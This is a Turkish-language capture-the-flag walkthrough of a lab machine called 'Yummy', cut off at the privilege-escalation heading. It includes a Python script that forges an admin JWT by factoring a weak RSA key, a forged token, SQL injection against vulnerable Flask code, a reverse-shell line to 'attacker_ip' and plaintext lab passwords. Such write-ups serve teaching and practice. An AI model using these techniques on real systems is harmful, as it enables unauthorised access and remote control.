---
{"dg-publish":true,"permalink":"/ctf/yummy-ctf/"}
---


### Nmap

```
echo "10.10.11.36 yummy.htb" | sudo tee -a /etc/hosts 
```

```
nmap yummy.htb -p- --min-rate 10000
```

![Pasted image 20250115161657.png](/img/user/resimler/Pasted%20image%2020250115161657.png)

```
nmap -p 22,80 -sCV yummy.htb
```

![Pasted image 20250115162002.png](/img/user/resimler/Pasted%20image%2020250115162002.png)

![Pasted image 20250115162043.png](/img/user/resimler/Pasted%20image%2020250115162043.png)

**HTTP Server Header**: Sunucu, kendisini "Caddy" olarak tanıtmış.


### Directory Brute Force

![Pasted image 20250115162631.png](/img/user/resimler/Pasted%20image%2020250115162631.png)
![Pasted image 20250115162713.png](/img/user/resimler/Pasted%20image%2020250115162713.png)
![Pasted image 20250115162756.png](/img/user/resimler/Pasted%20image%2020250115162756.png)
![Pasted image 20250115162828.png](/img/user/resimler/Pasted%20image%2020250115162828.png)
![Pasted image 20250115162842.png](/img/user/resimler/Pasted%20image%2020250115162842.png)

Çok fazla çıktı üretti genel olarak öğrendiklerimiz.

1. **Register ve Login Sayfaları**:
    
    - `http://yummy.htb/register`
    - `http://yummy.htb/login`
    
    Kullanıcı kaydı ve oturum açma gibi fonksiyonlar genellikle zafiyetlerin olduğu yerlerdir (ör. SQL Injection, Credential Stuffing, vb.).
    
2. **Dashboard ve Logout Yönlendirmeleri**:
    
    - `http://yummy.htb/dashboard`
    - `http://yummy.htb/logout`
    
    `Dashboard` genelde yalnızca oturum açmış kullanıcılar için erişilebilir olur. Ayrıca `logout` dizini yönlendirme içeriyor; burada oturum yönetimiyle ilgili açıklar araştırılabilir.
    
3. **Book Sayfası**:
    
    - `http://yummy.htb/book`
    
    Bu dizin, potansiyel olarak veri girilebilecek veya dinamik içerik sağlayan bir yer olabilir. Farklı HTTP metodları (POST gibi) denenerek işlevsellik incelenebilir.
    

4. **Statik Kaynaklardan İlginç Olabilecekler**:
    
    - **`/static/js/main.js`**: JavaScript dosyaları genelde istemci tarafında yürütülen kodları içerir. Bu kodlar bazen önemli API endpoint'lerini veya gizli parametreleri ortaya çıkarabilir.
    - **`/static/js/navbar.js` ve `/static/js/datetime.js`**: Navbar veya zamanla ilgili bir şey dinamik yükleniyor olabilir. Bunun içerikleri kontrol edilebilir.

5. **Potansiyel Olarak Test Edilebilecek Dizinler**:
    
    - `http://yummy.htb/static/vendor/`: Vendor dosyaları içinde eski veya zafiyetli bir kütüphane olabilir.
    - `http://yummy.htb/static/img/`: Görseller genelde önemli değildir, ancak bazen metadata veya açıklayıcı bilgiler içerir.
    


### Web Site

![Pasted image 20250115163443.png](/img/user/resimler/Pasted%20image%2020250115163443.png)

Web sayfasına gidin ve kullanıcı olarak kaydolun ve ardından oturum açın.

Web sayfasına gidin ve kullanıcı olarak kaydolun ve ardından oturum açın.

Ardından BOOK A TABLE'a gidin, istediğiniz bilgileri girin ve gönderin.

![Pasted image 20250115163820.png](/img/user/resimler/Pasted%20image%2020250115163820.png)

![Pasted image 20250115164019.png](/img/user/resimler/Pasted%20image%2020250115164019.png)

![Pasted image 20250115164038.png](/img/user/resimler/Pasted%20image%2020250115164038.png)

"Rezervasyon talebiniz gönderildi. Randevunuzu hesabınızdan daha fazla yönetebilirsiniz. Teşekkür ederiz! "

Ardından Dashborad'a geri dönün ve paketleri almak için Burpsuite'i kullanmak üzere bir indirme bağlantısı var

![Pasted image 20250115164457.png](/img/user/resimler/Pasted%20image%2020250115164457.png)

İlk GET isteğinin token'idir doğrudan izin veriliyor.

![Pasted image 20250115164734.png](/img/user/resimler/Pasted%20image%2020250115164734.png)

Sunucudan 500 hatası alırsanız, yeni bir paket yakalamanız ve repeater'a göndermeniz gerekir.
İkinci paket Repeater'a gönderilir ve URL parametreleri /etc/passwd dosyasını okuyacak şekilde değiştirilir.

![Pasted image 20250115165633.png](/img/user/resimler/Pasted%20image%2020250115165633.png)

Ve içinde iki mevcut kullanıcı bulundu: dev, qa

* **dev**: Kullanıcı hesabı, /home/dev dizininde bulunan ve bash shell'e sahip.
* **qa**: Test (Quality Assurance) amaçlı bir kullanıcı, /home/qa dizininde bulunan ve bash shell'e sahip.
* `_laurel`: `/var/log/laurel` dizininde bulunan ve `/bin/false` shelle sahip bir kullanıcı. Bu kullanıcı, oturum açma izni olmayan bir hesap gibi görünüyor. (dikkat'e alınmayabilir şimdilik.)


Ve Caddy'nin bazı sunucu yapılandırmalarını okuyabildim.

![Pasted image 20250115170331.png](/img/user/resimler/Pasted%20image%2020250115170331.png)

Ancak başka hiçbir yapılandırma dosyası veya SSH anahtarı doğrudan okunamadı, ancak zamanlanmış görev okunduğunda dosya yedeklemeye benzer bir komut dosyası ortaya çıktı

![Pasted image 20250115170429.png](/img/user/resimler/Pasted%20image%2020250115170429.png)

Bu app_backup.sh dosyasını okumak, dizinde source backup dosyaları olduğunu ortaya çıkarır

![Pasted image 20250115170528.png](/img/user/resimler/Pasted%20image%2020250115170528.png)

Bu dosyayı doğrudan indirin

İçindeki app.py dosyasını okuyun ve veritabanı parola sızıntısını bulun

![Pasted image 20250115171718.png](/img/user/resimler/Pasted%20image%2020250115171718.png)

### JWT Token

Yapılandırmada bir RSA anahtar oluşturma script'i bulundu.

![Pasted image 20250115172030.png](/img/user/resimler/Pasted%20image%2020250115172030.png)

JWTtoken'ı alıp şifresini çözdüğünüzde, n ve e büyük tamsayılarının değerlerinin Payload'da sızdırıldığını görebilirsiniz.

![Pasted image 20250115172603.png](/img/user/resimler/Pasted%20image%2020250115172603.png)

RSA algoritmasına göre, p ve q'nun n'nin iki asal çarpanı olduğu bilinmektedir. n'yi ayrıştırmak için bir kütüphane fonksiyonu kullanılabilir.

```
import base64
import json
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
 
 
#enter your jwt token here
token = ""
 
 
js = json.loads(base64.b64decode( token.split(".")[1] + "===").decode())
n= int(js["jwk"]['n'])
p,q= list((sympy.factorint(n)).keys()) #divide n
e=65537
phi_n = (p-1)*(q-1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()
 
private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
 
data = jwt.decode(token,  public_key, algorithms=["RS256"] )
data["role"] = "administrator"
 
# Create  new admin token  
new_token = jwt.encode(data, private_key, algorithm="RS256")
print(new_token)
```

Yeni token'ı değiştirdikten sonra, admindashboard'a yönlendirileceksiniz.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InF3ZWFzZHp4YzEyMzNAZ21haWwuY29tIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJpYXQiOjE3MzY5NTQ1NDIsImV4cCI6MTczNjk1ODE0MiwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDc0OTk5ODc0MjgwODkzNjY4OTIyMjYwNjQxMDg0ODAyMjk0ODQ5NzI3ODEyMDE4ODgyNzI1OTk0NjczNjk3MjI3NDk3Nzg5NTE2NjI1MTQwODYyOTIyNzY3Mjg5NTU3MjcwODYyNzYzMjQ2NTkyNTA3ODI2NzA4NTQ1MTI4ODQ3OTg0ODAwOTYxMDc5MjY2MDcyMTE4OTIxNDEyNjMxMDkxNjY2NzQ1Mjg2MzA1MDI4NDIzNjU0NTE1ODk0ODgxNDA3ODU5MzczNTUxMTA4NzU4MDk5NzExOTk0ODU5MzYxODc3MDA4Mjk5ODAxMDMwNzcxODMxMTExMjQxMjY3OTkzMzc4NzgxMTc4NTc2NDk1MTM4MDY2NTU5MTI2NDU4MTE3NDQ4ODEwMDk2MzAyNDM4Njk1NTk0NjkiLCJlIjo2NTUzN319.AGzD0wKJWNheI5AnmqPWcWmg3OeTM18854e57-q9q3jWgvDyr_0WLMwAVh4o3ZPepCve3zOrSh0fjXlXfDoFiYakunxvPAK2oDdfK_FM7JFP1VNmi0KFJskExZUbuWCGGFEgIwsF4CIqD_widB6pBtFVv8gtgKBq2mzrxC_vTpyR_7E
```

Her istekte token'ınımızı güncelleyeceğiz.

![Pasted image 20250115190000.png](/img/user/resimler/Pasted%20image%2020250115190000.png)

## SQL Injection

Kaynak kod kontrol edildiğinde, order_query parametresinde filtreleme yoktur

```
@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)

```

![Pasted image 20250115191138.png](/img/user/resimler/Pasted%20image%2020250115191138.png)

![Pasted image 20250115231922.png](/img/user/resimler/Pasted%20image%2020250115231922.png)

![Pasted image 20250115231910.png](/img/user/resimler/Pasted%20image%2020250115231910.png)

Union injection ile error injection olasılığı olduğunu görüyorum.

![Pasted image 20250116005405.png](/img/user/resimler/Pasted%20image%2020250116005405.png)

İsteği yakalayıp sqlmap'e verdiğimde başarılı bir şekilde dump edebiliyorum fakat herhangi bir kayda değer bilgi yok. 

Önceki zamanlanmış göreve geri dönersek, bir `dbmonitor.sh` çalıştıracak bir mysql zamanlanmış görevi vardır

Herhangi bir dosyadan dbmonitor.sh dosyasını indirin.

```
#!/bin/bash
 
timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)
 
if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi
 
[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

MySQL servisi aktif olduğunda ve /data/scripts/dbstatus.json dosyası mevcut olduğunda: Eğer dbstatus.json dosyasının içeriğinde "database is down" ifadesi yer alıyorsa, bu, veritabanının daha önce bir arıza yaşadığını gösterir. Bu durumda, bir kurtarma bildirimi gönderilir ve durum dosyası silinir.

```
/usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
/usr/bin/rm -f /data/scripts/dbstatus.json
```

Eğer dbstatus.json dosyasının içeriğinde "database is down" ifadesi yer almıyorsa, bu durumda otomasyon süreci başarısız kabul edilir ve en son onarım scripti yeniden çalıştırılır.

```
/usr/bin/echo "The automation failed in some way, attempting to fix it."
latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
/bin/bash "$latest_version"
```

/data/scripts/fixer-v* dosyasının bulunduğunu gördük. Burada bir joker karakter (wildcard) kullanıldığı için ve önceki tahminlerimize dayanarak MySQL ile dosya yazılabildiği için, içinde bash scripti bulunan bir dosya yazmayı deneyebiliriz. Ardından, zamanlanmış görevlerin çalışmasını bekleyip, geri bağlantı (reverse shell) dinleyebiliriz.


---

### Adımlar:

1. **Joker Karakter (Wildcard) Kullanımı**: `/data/scripts/fixer-v*` ifadesindeki `*` joker karakteri, belirli bir desenle eşleşen tüm dosyaları ifade eder. Yani, bu dizinde `fixer-v` ile başlayan tüm dosyalar bu desenle eşleşir. Eğer burada birden fazla dosya varsa, bu dosyaların adlarıyla oynanabilir.
    
2. **MySQL ile Dosya Yazma**: Eğer sistemdeki MySQL veritabanı, kullanıcıya dosya yazma izinleri veriyorsa, bu izinler kötüye kullanılabilir. MySQL veritabanına yazma işlemi, bazen doğrudan veritabanı üzerinde işlem yaparak dosya oluşturulabilir. Eğer dosya yoluna yazılabilecek izinler varsa, kötü niyetli bir betik (script) veya dosya yazılabilir.
    
3. **Bash Scripti Yazma**: Dosya, örneğin bir bash komut dosyası (bash script) olabilir. Bu dosya, hedef sistemde komutları çalıştırarak çeşitli işlemleri gerçekleştirebilir. Örneğin:
    
    - Reverse Shell komutları çalıştırmak
    - Hedef sisteme uzaktan erişim sağlamak
    - Kullanıcının yetkisini artırmaya yönelik adımlar atmak
    
    Örneğin, MySQL ile yazılacak dosya şu şekilde olabilir:

```
#!/bin/bash 
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

Bu komut, bir reverse shell başlatır ve saldırganın IP adresine geri bağlanır.

4. **Zamanlanmış Görevler (Cron Jobs) Kullanmak**: Bu yazılan dosya genellikle zamanlanmış bir görev tarafından çalıştırılabilir. Linux sistemlerinde cron, belirli zaman dilimlerinde komutların çalışmasını sağlamak için kullanılır. Örneğin, cron tablosunda bu dosyanın her dakika çalışması sağlanabilir. Cron, otomatik olarak bu bash scriptini çalıştırarak saldırganın belirttiği komutları yürütebilir.


### Özet:

Bu adımlar, saldırganın MySQL veritabanına dosya yazma izinlerini kullanarak, zamanlanmış bir görevi tetiklemek ve kötü niyetli bir bash scripti çalıştırmak amacıyla gerçekleştirilir. Bu script, genellikle geri bağlantı (reverse shell) kurarak saldırganın hedef sisteme uzaktan erişim sağlamasına olanak tanır. Bu tür bir saldırı, sistemdeki güvenlik açıklarının keşfi ve kötüye kullanımı yoluyla gerçekleştirilir.


---

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
 
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

`/etc/crontab` içinde, MySQL'in her dakika bir kez `dbmonitor.sh` script'ini çalıştırdığı bulundu.

İlk olarak, bir JSON dosyası yazılmalı, ardından bir düzenli ifadeye (regex) uyan bir script yazılmalıdır.

![Pasted image 20250116012522.png](/img/user/resimler/Pasted%20image%2020250116012522.png)

![Pasted image 20250116012506.png](/img/user/resimler/Pasted%20image%2020250116012506.png)

Zamanlanmış görevler içinde, MySQL dışında bir de `www-data` kullanıcısına ait bir zamanlanmış görev olduğu fark edildi. Bu nedenle, bir reverse bağlantı Shell'ini `app_backup.sh` olarak yeniden adlandırıp, `www-data`'nın bunu çalıştırmasını bekleyebilirsiniz.

![Pasted image 20250116013656.png](/img/user/resimler/Pasted%20image%2020250116013656.png)

"3wDo7gSRZIwIHRxZ"

![Pasted image 20250116013726.png](/img/user/resimler/Pasted%20image%2020250116013726.png)

"jPAd!XQCtn8Oc@2B"


User.txt dosyasını almak için SSH girişi



---

## Privilege Escalation

Sudo -l Geçerli kullanıcıyı görüntüle komutu
